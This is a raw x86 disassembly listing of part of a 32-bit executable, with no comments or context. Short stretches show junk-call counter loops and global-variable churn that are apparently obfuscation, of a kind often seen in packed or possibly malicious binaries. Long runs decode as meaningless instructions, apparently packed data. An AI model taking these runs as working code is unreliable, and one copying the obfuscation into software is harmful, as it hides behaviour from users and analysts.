  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x43372b
  40736f:	or     DWORD PTR ds:0x43372f,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x407397
  407387:	cmc    
  407388:	xchg   ecx,eax
  407389:	ins    DWORD PTR es:[edi],dx
  40738a:	or     al,dl
  40738c:	jle    0x40740c
  40738e:	add    eax,0xb7e7e7c
  407393:	jnp    0x407331
  407395:	fstp   DWORD PTR [ecx+0x54]
  407398:	mov    ds:0x44bc457e,al
  40739d:	inc    esp
  40739e:	fwait
  40739f:	mov    ds:0xae27f5fd,eax
  4073a4:	sahf   
  4073a5:	imul   esi,edx,0xa6ca1597
  4073ab:	lods   al,BYTE PTR gs:[esi]
  4073ad:	dec    ecx
  4073ae:	fldcw  WORD PTR ds:0x5229c290
  4073b4:	mov    ecx,0xa44d7760
  4073b9:	cmp    esi,DWORD PTR [ecx*2-0x1302ee62]
  4073c0:	and    ah,BYTE PTR [ebx+eiz*8]
  4073c3:	sti    
  4073c4:	fstp   QWORD PTR [ecx-0x15d413a6]
  4073ca:	das    
  4073cb:	fucomip st,st(2)
  4073cd:	and    ch,BYTE PTR [ecx+0x54939ac6]
  4073d3:	fsubp  st(7),st
  4073d5:	retf   0x9293
  4073d8:	and    BYTE PTR [edi+0x54],0xc1
  4073dc:	and    al,0xd0
  4073de:	sahf   
  4073df:	std    
  4073e0:	shl    ecx,0xa1
  4073e3:	xchg   edx,eax
  4073e4:	xchg   ebx,eax
  4073e5:	sub    al,0x94
  4073e7:	call   FWORD PTR [esi+edx*1]
  4073ea:	mov    ch,0x5a
  4073ec:	jecxz  0x407432
  4073ee:	add    DWORD PTR [ebp+0x23f985f0],ecx
  4073f4:	adc    edi,ecx
  4073f6:	idiv   cl
  4073f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073f9:	pop    esi
  4073fa:	adc    ebp,DWORD PTR [esi]
  4073fc:	mov    edi,0x19dfd4ca
  407401:	aaa    
  407402:	imul   edi,DWORD PTR [edi-0x41fb59d4],0xbd58f04e
  40740c:	js     0x407468
  40740e:	push   ebp
  40740f:	mov    ecx,0x3464aeb1
  407414:	xor    bl,al
  407416:	xor    ecx,esp
  407418:	mov    ds:0x9bc84393,al
  40741d:	pop    ebx
  40741e:	stos   BYTE PTR es:[edi],al
  40741f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407420:	in     al,dx
  407421:	add    al,0x15
  407423:	stos   BYTE PTR es:[edi],al
  407424:	jmp    0x1014332c
  407429:	cs mov cl,0x6
  40742c:	jb     0x4073fd
  40742e:	mov    WORD PTR [esi],gs
  407430:	adc    bh,BYTE PTR [eax+edx*8+0x2ca9f72a]
  407437:	sbb    BYTE PTR [eax-0x79],ch
  40743a:	push   ebp
  40743b:	scas   eax,DWORD PTR es:[edi]
  40743c:	push   eax
  40743d:	push   eax
  40743e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40743f:	test   ch,0x65
  407442:	and    DWORD PTR [edi-0x65fccfef],esi
  407448:	nop
  407449:	pop    ebp
  40744a:	dec    ebx
  40744b:	jge    0x4074cb
  40744d:	mov    al,ds:0x19431c0
  407452:	mov    ds:0xa2243a3c,eax
  407457:	repnz or al,0x3d
  40745a:	xor    al,0xb0
  40745c:	inc    ebp
  40745d:	lock es jnp 0x40742a
  407461:	pusha  
  407462:	push   edx
  407463:	out    dx,al
  407464:	adc    eax,0xfa9824f1
  407469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40746a:	adc    eax,0x3383c204
  40746f:	sub    ebp,DWORD PTR [esi-0x60]
  407472:	loope  0x4073fe
  407474:	test   eax,0xb9eac91a
  407479:	or     eax,esp
  40747b:	int    0x22
  40747d:	and    eax,0xe5a244a1
  407482:	add    BYTE PTR [edi+ecx*1-0x2c],ah
  407486:	shr    BYTE PTR [eax+0x5c],0xfd
  40748a:	stos   DWORD PTR es:[edi],eax
  40748b:	jp     0x4074d1
  40748d:	jb     0x4074a9
  40748f:	arpl   si,ax
  407491:	out    dx,al
  407492:	cli    
  407493:	in     eax,dx
  407494:	adc    eax,0x51a64ddd
  407499:	xchg   edi,eax
  40749a:	mov    ebp,0x36d6921f
  40749f:	xor    al,0xa8
  4074a1:	pop    ebx
  4074a2:	xor    DWORD PTR [edx+0xd],ebx
  4074a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074a6:	push   ds
  4074a7:	cmp    eax,0x3330e1a1
  4074ac:	lock xchg edx,eax
  4074ae:	dec    ebx
  4074af:	fst    DWORD PTR [esi+0x679244ca]
  4074b5:	mov    ebx,0xe5a118ca
  4074ba:	icebp  
  4074bb:	mov    al,bl
  4074bd:	sub    edx,DWORD PTR [esi+0x3a]
  4074c0:	mov    bh,0xa8
  4074c2:	lahf   
  4074c3:	mov    esi,DWORD PTR [edx+0x54345e76]
  4074c9:	sbb    BYTE PTR [ebp-0x78ab9cb1],ah
  4074cf:	dec    edi
  4074d0:	test   al,0x10
  4074d2:	fs inc edx
  4074d4:	mov    ds:0x570a5d1c,eax
  4074d9:	mov    esi,DWORD PTR [eax]
  4074db:	cdq    
  4074dc:	xchg   ecx,eax
  4074dd:	rol    BYTE PTR [ebx+0x1c8f8c4c],cl
  4074e3:	pop    ebx
  4074e4:	and    edi,DWORD PTR ds:0xf3776441
  4074ea:	(bad)  
  4074eb:	loop   0x4074a0
  4074ed:	and    al,0x14
  4074ef:	stos   DWORD PTR es:[edi],eax
  4074f0:	add    eax,0x35b54456
  4074f5:	and    BYTE PTR [edi+edi*4],dl
  4074f8:	inc    edi
  4074f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074fa:	outs   dx,DWORD PTR ds:[esi]
  4074fb:	sbb    DWORD PTR [ebx],edx
  4074fd:	pop    edx
  4074fe:	outs   dx,DWORD PTR ds:[esi]
  4074ff:	mov    al,0x2e
  407501:	sbb    bl,BYTE PTR ds:0x69e19aa8
  407507:	cs test eax,0xb4c2061e
  40750d:	out    0xfe,eax
  40750f:	mov    ebx,0xb4ae8123
  407514:	mov    ah,cl
  407516:	(bad)  [esi-0x110c0cc8]
  40751c:	rcl    eax,0xa4
  40751f:	pop    es
  407520:	add    eax,0xaf41b831
  407525:	jns    0x407528
  407527:	xor    ch,BYTE PTR [esp+ebx*2+0x58]
  40752b:	retf   
  40752c:	int3   
  40752d:	push   0xffffffb6
  40752f:	add    dh,al
  407531:	and    al,0x7d
  407533:	addr16 jbe 0x407560
  407536:	add    ebp,DWORD PTR [esi-0x3f8434ba]
  40753c:	mov    al,ds:0xf1b58ab8
  407541:	maskmovq mm7,(bad)
  407542:	idiv   DWORD PTR [ebx+0x19]
  407545:	add    eax,0x874e6b3d
  40754a:	inc    esp
  40754b:	or     ebp,ecx
  40754d:	sub    bl,BYTE PTR [eax+0x39]
  407550:	adc    ch,BYTE PTR [edi+0x6a]
  407553:	cmp    esp,DWORD PTR [ebx-0x5]
  407556:	inc    ecx
  407557:	push   ss
  407558:	dec    ecx
  407559:	out    dx,eax
  40755a:	mov    dl,dh
  40755c:	fstp   QWORD PTR ds:0x6f8fd228
  407562:	in     al,dx
  407563:	sar    DWORD PTR [edi],0x52
  407566:	cmp    cl,BYTE PTR [ebx-0x5e7ff53b]
  40756c:	scas   al,BYTE PTR es:[edi]
  40756d:	loopne 0x407554
  40756f:	xor    BYTE PTR [ecx],bl
  407571:	jp     0x407514
  407573:	cli    
  407574:	addr16 adc eax,0x97aac3c6
  40757a:	nop
  40757b:	cmp    DWORD PTR [edi],0xffffffba
  40757e:	(bad)  
  407580:	ss mov bl,0x2e
  407583:	je     0x40756d
  407585:	add    esi,DWORD PTR [esi]
  407587:	lds    ebp,FWORD PTR [ebx+ebp*1-0x26]
  40758b:	fwait
  40758c:	add    eax,0x24a6e85c
  407591:	dec    ebp
  407592:	jb     0x407612
  407594:	mov    ecx,0x1b219b38
  407599:	retf   
  40759a:	outs   dx,DWORD PTR ds:[esi]
  40759b:	lods   al,BYTE PTR ds:[esi]
  40759c:	aad    0xc7
  40759e:	inc    ebp
  40759f:	in     al,dx
  4075a0:	xor    DWORD PTR [ebp+0x5135f89c],eax
  4075a6:	add    eax,0x77b80000
  4075ab:	xchg   ebp,eax
  4075ac:	add    BYTE PTR [eax],al
  4075ae:	mov    ecx,DWORD PTR ds:0x433653
  4075b4:	sub    DWORD PTR ds:0x43360f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x4335ff
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x43366b,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43360f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43360f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43360f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43360f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43360f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	int    0x99
  407657:	rcr    BYTE PTR [ebp+0x7e7ec011],0x5
  40765e:	jl     0x4076de
  407660:	jle    0x407657
  407662:	ret    0x88d2
  407665:	add    al,0xce
  407667:	dec    esp
  407668:	ins    BYTE PTR es:[edi],dx
  407669:	xor    eax,DWORD PTR [ebp+0x62]
  40766c:	in     al,dx
  40766d:	mov    DWORD PTR [esi],esp
  40766f:	int3   
  407670:	jl     0x4075f8
  407672:	popf   
  407673:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  407675:	jo     0x40767f
  407677:	xchg   edi,eax
  407678:	xlat   BYTE PTR ds:[ebx]
  407679:	pop    ss
  40767a:	and    eax,0xadff5fcb
  40767f:	push   es
  407680:	cvtpi2ps xmm2,QWORD PTR [ebp-0x11f28471]
  407687:	add    ch,ch
  407689:	repnz mov eax,0xe4c41fa9
  40768f:	daa    
  407690:	clc    
  407691:	(bad)  
  407692:	sub    DWORD PTR [ebx+0x4],0x7b3df201
  407699:	adc    al,0xb1
  40769b:	inc    ecx
  40769c:	int    0x44
  40769e:	sub    esp,DWORD PTR [edx]
  4076a0:	push   edi
  4076a1:	sahf   
  4076a2:	ret    
  4076a3:	test   eax,0x812c54f1
  4076a8:	and    ebx,eax
  4076aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076ab:	aad    0x9c
  4076ad:	retf   0x78ad
  4076b0:	ds inc eax
  4076b2:	and    eax,0x6b3d4b4c
  4076b7:	psrlw  mm0,QWORD PTR [ebp-0x10fc5920]
  4076be:	mov    ah,0x6c
  4076c0:	pop    ecx
  4076c1:	mul    DWORD PTR [edi+edx*2-0x1f700a4c]
  4076c8:	fisttp DWORD PTR [esi]
  4076ca:	enter  0x18d3,0x93
  4076ce:	push   ecx
  4076d0:	lock jge 0x4076ec
  4076d3:	stos   BYTE PTR es:[edi],al
  4076d4:	sbb    DWORD PTR [edx-0x44],edi
  4076d7:	stos   DWORD PTR es:[edi],eax
  4076d8:	mov    ch,0xb1
  4076da:	and    ecx,DWORD PTR [eax]
  4076dc:	inc    ecx
  4076dd:	pop    esp
  4076de:	xor    esi,DWORD PTR [edx-0x1207b5ff]
  4076e4:	ret    
  4076e5:	pusha  
  4076e6:	mov    ds:0xf3451f4d,al
  4076eb:	sbb    al,0x52
  4076ed:	inc    ebp
  4076ee:	xchg   edx,eax
  4076ef:	inc    ecx
  4076f0:	jmp    0xc479776c
  4076f5:	mov    ebp,0x3601864f
  4076fa:	inc    ebx
  4076fb:	gs loop 0x4076bb
  4076fe:	aam    0x6f
  407700:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407701:	stos   DWORD PTR es:[edi],eax
  407702:	xor    al,BYTE PTR [edx-0x35]
  407705:	inc    edi
  407706:	retf   0xa37c
  407709:	imul   esi,DWORD PTR [edi+0x2e],0xfd99c7bb
  407710:	dec    edx
  407711:	adc    edi,DWORD PTR [eax]
  407713:	xor    al,0x36
  407715:	iret   
  407716:	push   ss
  407717:	jb     0x4076f3
  407719:	arpl   bp,si
  40771b:	mov    edx,0xaa7a7832
  407720:	jbe    0x4076ca
  407722:	into   
  407723:	in     eax,0xe0
  407725:	cld    
  407726:	test   BYTE PTR [ebx-0x247a8373],bl
  40772c:	pop    esp
  40772d:	ror    ecx,0xa0
  407730:	cmp    eax,0xbd612907
  407735:	xchg   DWORD PTR [eax-0xd58137e],esp
  40773b:	lods   al,BYTE PTR ds:[esi]
  40773c:	pop    es
  40773d:	ret    0x9e46
  407740:	fisub  WORD PTR [ecx]
  407742:	call   0x2f4c85e5
  407747:	jno    0x4076fb
  407749:	adc    cl,dl
  40774b:	test   ebx,ecx
  40774d:	in     eax,0xe8
  40774f:	jge    0x40778e
  407751:	addr16 push ebx
  407753:	daa    
  407754:	or     ah,BYTE PTR [ebp-0x69]
  407757:	iret   
  407758:	out    0x93,eax
  40775a:	jecxz  0x4076e0
  40775c:	push   edi
  40775d:	add    eax,0xa224e181
  407762:	(bad)  
  407763:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407764:	push   eax
  407765:	xchg   esp,eax
  407766:	sahf   
  407767:	push   cs
  407768:	push   esp
  407769:	ins    BYTE PTR es:[edi],dx
  40776a:	cmc    
  40776b:	hlt    
  40776c:	push   ds
  40776d:	jno    0x407798
  40776f:	mov    DWORD PTR [ecx+0x4d0c294a],ecx
  407775:	fld    DWORD PTR [ebp+ebx*1-0x1]
  407779:	xor    edx,DWORD PTR [ecx+0x5dd23658]
  40777f:	push   cs
  407780:	dec    eax
  407781:	xchg   BYTE PTR [eax-0x4],dh
  407784:	(bad)  
  407785:	pop    ebx
  407786:	cmp    ebx,DWORD PTR [edx]
  407788:	and    al,0x95
  40778a:	mov    BYTE PTR [ebx-0x39],bh
  40778d:	es sub edi,edx
  407790:	shl    DWORD PTR [edx+0x3e],1
  407793:	sbb    DWORD PTR [ebx+0x20],ebx
  407796:	(bad)  
  407797:	call   0x8647:0x4007c2bf
  40779e:	mov    eax,ds:0x3999695c
  4077a3:	mov    BYTE PTR [edi+0x19cac891],ch
  4077a9:	loopne 0x407817
  4077ab:	pop    es
  4077ac:	call   0xd7f141dd
  4077b1:	dec    esp
  4077b2:	jne    0x40782f
  4077b4:	enter  0x5d1c,0x5c
  4077b8:	ret    
  4077b9:	scas   eax,DWORD PTR es:[edi]
  4077ba:	in     al,dx
  4077bb:	stc    
  4077bc:	jl     0x40781f
  4077be:	or     edx,DWORD PTR [ecx-0x73a85dc8]
  4077c4:	sub    bh,BYTE PTR [edx]
  4077c6:	lods   al,BYTE PTR ds:[esi]
  4077c7:	aad    0x8b
  4077c9:	fld    QWORD PTR [edx+0x190f45d]
  4077cf:	mov    eax,ds:0x51b21e9a
  4077d4:	adc    BYTE PTR [edi+0x1a76a8a1],0x98
  4077db:	push   0x26
  4077dd:	enter  0xe506,0xb0
  4077e1:	pop    es
  4077e2:	stos   DWORD PTR es:[edi],eax
  4077e3:	push   0xffffffd0
  4077e5:	jmp    0x407848
  4077e7:	push   ebp
  4077e8:	sub    DWORD PTR [ebp+0x3],ebp
  4077eb:	xor    esp,DWORD PTR [edx+0x1b552263]
  4077f1:	dec    ebx
  4077f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077f3:	add    esi,ebp
  4077f5:	or     BYTE PTR [ebx+0x55bae1a7],al
  4077fb:	inc    edi
  4077fc:	xor    dl,BYTE PTR [edx]
  4077fe:	push   cs
  4077ff:	push   0x6
  407801:	jnp    0x4077b7
  407803:	inc    ebp
  407804:	dec    esp
  407805:	or     DWORD PTR [edx-0xbad12c5],ecx
  40780b:	fdivr  DWORD PTR ds:0x9014bf85
  407811:	arpl   bp,dx
  407813:	fisubr DWORD PTR [edx+0x3f]
  407816:	xor    BYTE PTR [edx],ah
  407818:	mov    esp,0x1677d945
  40781d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40781e:	push   ebx
  40781f:	aas    
  407820:	nop
  407821:	leave  
  407822:	and    al,0xa3
  407824:	and    edi,DWORD PTR [edx]
  407826:	pop    eax
  407827:	inc    ebp
  407828:	adc    DWORD PTR ss:[ebp-0x1a65703],edx
  40782f:	aam    0x2c
  407831:	mov    dh,dh
  407833:	ins    BYTE PTR es:[edi],dx
  407834:	adc    DWORD PTR [esp+edi*2-0x6a],0x24d76355
  40783c:	and    BYTE PTR [ebx+0x3b579b05],al
  407842:	leave  
  407843:	cmp    dh,BYTE PTR [edi+0x2a000afe]
  407849:	xchg   ebx,eax
  40784a:	mov    DWORD PTR [ecx-0x727c93aa],edi
  407850:	popf   
  407851:	loope  0x4077e7
  407853:	cmp    esi,DWORD PTR [eax-0x24]
  407856:	add    cl,BYTE PTR [ebp+0x36]
  407859:	xor    BYTE PTR [esi+0x6b],ch
  40785c:	pop    es
  40785d:	data16 sub bl,dl
  407860:	clc    
  407861:	leave  
  407862:	push   0xffffffdc
  407864:	ins    DWORD PTR es:[edi],dx
  407865:	loopne 0x40784d
  407867:	and    eax,ebx
  407869:	dec    esp
  40786a:	inc    ebx
  40786b:	xchg   DWORD PTR [esi+0x2b],edx
  40786e:	into   
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x4335ff,0x433663
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43371b,0x12
  40788b:	cmp    DWORD PTR ds:0x43371b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43371b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43371b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43371b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43369f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43369f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43369f,esi
  4078e0:	cmp    DWORD PTR ds:0x43369f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43369f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0xf4,eax
  407922:	mov    ds:0xce246d09,al
  407927:	jle    0x4079a7
  407929:	add    eax,0x547e7e7c
  40792e:	scas   al,BYTE PTR es:[edi]
  40792f:	leave  
  407930:	jg     0x4078f5
  407932:	push   edx
  407933:	ror    BYTE PTR [edi],cl
  407935:	push   eax
  407936:	cmp    BYTE PTR [edx-0x5c166062],bh
  40793c:	mov    ?,WORD PTR [ecx]
  40793e:	add    ebx,DWORD PTR [ecx]
  407940:	sbb    eax,0x76295002
  407945:	std    
  407946:	(bad)  [ecx-0x627f345a]
  40794c:	or     bh,BYTE PTR [ebp+edi*8-0x2e]
  407950:	add    al,0xee
  407952:	jge    0x40791d
  407954:	xchg   ebp,eax
  407955:	hlt    
  407956:	inc    BYTE PTR [ebp-0x65]
  407959:	mov    esi,0x6f3e4583
  40795e:	pop    esp
  40795f:	and    dh,BYTE PTR [eax]
  407961:	pop    ecx
  407962:	clc    
  407963:	int    0x80
  407965:	dec    edx
  407966:	retf   0xfbf1
  407969:	cdq    
  40796a:	mov    bl,0x17
  40796c:	adc    ebx,DWORD PTR [edx+0x8959e42]
  407972:	(bad)  
  407973:	call   0x7ca2f05c
  407978:	sti    
  407979:	cmp    eax,0xac7d40e7
  40797e:	xchg   esi,eax
  40797f:	dec    edx
  407980:	xor    al,0x31
  407982:	push   esp
  407983:	sbb    DWORD PTR [eax],esi
  407985:	gs push eax
  407987:	daa    
  407988:	shr    bl,cl
  40798a:	popf   
  40798b:	adc    eax,0x29907533
  407990:	pop    ebx
  407991:	cdq    
  407992:	in     al,dx
  407993:	xor    ebx,ebp
  407995:	mov    DWORD PTR [ebx-0x49770207],edx
  40799b:	mov    bh,0x53
  40799d:	jp     0x40798c
  40799f:	sbb    al,0xd8
  4079a1:	cmc    
  4079a2:	cwde   
  4079a3:	push   cs
  4079a4:	in     al,dx
  4079a5:	stos   BYTE PTR es:[edi],al
  4079a6:	sbb    eax,esp
  4079a8:	push   esp
  4079a9:	dec    edi
  4079aa:	fsubr  st,st(6)
  4079ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079ad:	aaa    
  4079ae:	dec    ecx
  4079af:	mov    cl,0x42
  4079b1:	xor    edi,esi
  4079b3:	ret    
  4079b4:	test   eax,0xe172a170
  4079b9:	dec    edi
  4079ba:	xor    al,0x5e
  4079bc:	cmp    dh,BYTE PTR [edi]
  4079be:	cmp    dh,al
  4079c0:	jbe    0x407981
  4079c2:	adc    eax,0x21845d0b
  4079c7:	outs   dx,BYTE PTR ds:[esi]
  4079c8:	jb     0x4079e6
  4079ca:	add    DWORD PTR [edx+0x5b],ecx
  4079cd:	and    cl,BYTE PTR [edx-0x70]
  4079d0:	call   DWORD PTR [ecx+0x13]
  4079d3:	leave  
  4079d4:	sub    DWORD PTR [ebx+0x6b],edx
  4079d7:	xchg   edi,eax
  4079d8:	les    edx,FWORD PTR [edi]
  4079da:	mov    WORD PTR [eax+0x2eed193e],?
  4079e0:	aam    0xc2
  4079e2:	cmp    eax,0x8f1e7f7a
  4079e7:	pop    edi
  4079e8:	les    ecx,FWORD PTR [ecx]
  4079ea:	test   BYTE PTR [ecx],ch
  4079ec:	xor    al,0x3d
  4079ee:	dec    edx
  4079ef:	into   
  4079f0:	jo     0x407a5b
  4079f2:	push   eax
  4079f3:	ret    0x2bf0
  4079f6:	fsub   QWORD PTR [ebx-0x246655d]
  4079fc:	mov    eax,0xaf7c3b97
  407a01:	das    
  407a02:	sub    dh,BYTE PTR [ebx-0x34]
  407a05:	xchg   edx,eax
  407a06:	(bad)  
  407a07:	xchg   ecx,eax
  407a08:	aas    
  407a09:	repz pop ecx
  407a0c:	mov    bl,0x80
  407a0e:	xchg   ebx,eax
  407a0f:	es loope 0x4079e2
  407a12:	or     al,0x2
  407a14:	pop    edi
  407a15:	sbb    BYTE PTR [esi],dl
  407a17:	dec    ebp
  407a18:	fsubr  DWORD PTR [edx-0x7b3293e6]
  407a1e:	rol    bl,0x68
  407a21:	pop    ebp
  407a22:	cmp    edi,0x928b9d0f
  407a28:	das    
  407a29:	dec    ebx
  407a2a:	and    al,0x4b
  407a2c:	fnsave [ecx+0x1a2353a]
  407a32:	jae    0x407a90
  407a34:	data16 sbb al,0x83
  407a37:	nop
  407a38:	add    BYTE PTR [ebx+ebp*8],dl
  407a3b:	and    al,0xee
  407a3d:	mov    eax,0xd3439bca
  407a42:	xchg   ebx,eax
  407a43:	adc    al,0x2e
  407a45:	jge    0x4079e0
  407a47:	and    ebx,esi
  407a49:	xor    esi,DWORD PTR [eax-0x10]
  407a4c:	jl     0x407a65
  407a4e:	(bad)  [ebp-0x4f]
  407a51:	jge    0x407ad0
  407a53:	or     al,0x57
  407a55:	mov    cl,0x14
  407a57:	or     DWORD PTR [edx+0x24],esp
  407a5a:	mov    eax,ds:0xe67cb5d5
  407a5f:	out    0xbc,eax
  407a61:	nop
  407a62:	dec    edx
  407a63:	jnp    0x407a80
  407a65:	mov    al,0xa3
  407a67:	push   edi
  407a68:	cld    
  407a69:	adc    al,0x60
  407a6b:	pop    ds
  407a6c:	mov    esi,DWORD PTR [esi-0x7c37edff]
  407a72:	pusha  
  407a73:	hlt    
  407a74:	dec    ecx
  407a75:	mov    es,WORD PTR [ecx-0x7d]
  407a78:	push   0x8390efa9
  407a7d:	mov    dl,0xcf
  407a7f:	dec    ax
  407a81:	adc    DWORD PTR [esi-0x23e1825],eax
  407a87:	test   DWORD PTR [edi+eiz*2],edx
  407a8a:	aaa    
  407a8b:	(bad)  
  407a8c:	daa    
  407a8d:	push   cs
  407a8e:	fist   DWORD PTR [ecx]
  407a90:	jbe    0x407b09
  407a92:	and    al,0xcf
  407a94:	retf   0x373d
  407a97:	mov    edx,0x58111174
  407a9c:	pushf  
  407a9d:	call   0xb5fa1239
  407aa2:	mov    edx,0x49192d2a
  407aa7:	sbb    ecx,DWORD PTR [esi]
  407aa9:	inc    eax
  407aaa:	jno    0x407ac2
  407aac:	idiv   BYTE PTR [esi+edx*4+0x73]
  407ab0:	xchg   DWORD PTR [esp+ebp*1+0x135decb7],esp
  407ab7:	or     bl,BYTE PTR [edx]
  407ab9:	adc    al,0x1a
  407abb:	outs   dx,DWORD PTR ds:[esi]
  407abc:	mov    cl,0x84
  407abe:	mov    eax,0xedb53387
  407ac3:	push   edi
  407ac4:	(bad)  
  407ac5:	xor    al,0x8c
  407ac7:	and    al,0x68
  407ac9:	or     DWORD PTR [edx*2+0x68110ff4],esi
  407ad0:	inc    ecx
  407ad1:	pop    es
  407ad2:	cli    
  407ad3:	sbb    al,0x1f
  407ad5:	inc    edx
  407ad6:	mov    ebx,ebp
  407ad8:	das    
  407ad9:	jmp    DWORD PTR gs:[ebp+0x14e6d945]
  407ae0:	scas   eax,DWORD PTR es:[edi]
  407ae1:	mov    al,0x0
  407ae3:	enter  0xc361,0x22
  407ae7:	push   esi
  407ae8:	inc    ebx
  407ae9:	retf   0xb9a5
  407aec:	inc    ebx
  407aed:	pop    eax
  407aee:	es jmp 0xed08b3a5
  407af4:	and    eax,DWORD PTR [ecx-0x33]
  407af7:	cmp    bh,BYTE PTR [ebx-0x59]
  407afa:	jge    0x407ae0
  407afc:	lahf   
  407afd:	or     bl,BYTE PTR [ecx+0x1b511914]
  407b03:	jns    0x407b38
  407b05:	clc    
  407b06:	cwde   
  407b07:	cli    
  407b08:	mov    ds:0x7afeaf34,al
  407b0d:	ja     0x407abc
  407b0f:	lock inc ecx
  407b11:	dec    esi
  407b12:	ins    DWORD PTR es:[edi],dx
  407b13:	int    0x56
  407b15:	sahf   
  407b16:	push   ebx
  407b17:	clc    
  407b18:	sub    ebp,DWORD PTR [esi+0x68]
  407b1b:	mov    ah,0x1a
  407b1d:	aam    0x25
  407b1f:	sub    ebx,esi
  407b21:	pop    esi
  407b22:	gs jae 0x407b46
  407b25:	test   DWORD PTR [ecx],eax
  407b27:	inc    esp
  407b28:	sub    DWORD PTR [ebp-0x7a],eax
  407b2b:	mov    eax,ds:0x4b4209d8
  407b30:	pop    esi
  407b31:	xor    DWORD PTR [esi+eax*8-0x5d],0xffffffe4
  407b36:	sbb    BYTE PTR [ecx],bl
  407b38:	xor    eax,ecx
  407b3a:	adc    DWORD PTR ds:0x4336ab,0x1c6e
  407b44:	mov    esi,0x32729b
  407b49:	mov    DWORD PTR ds:0x433653,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433607,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x43372f,0x43360f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43369f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433603
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x4336a7,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43361f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x43366b,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x43366b,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x4336d7
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x433657,0x11
  407bd9:	cmp    DWORD PTR ds:0x433657,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x433657,0x6
  407bed:	jne    0x407c03
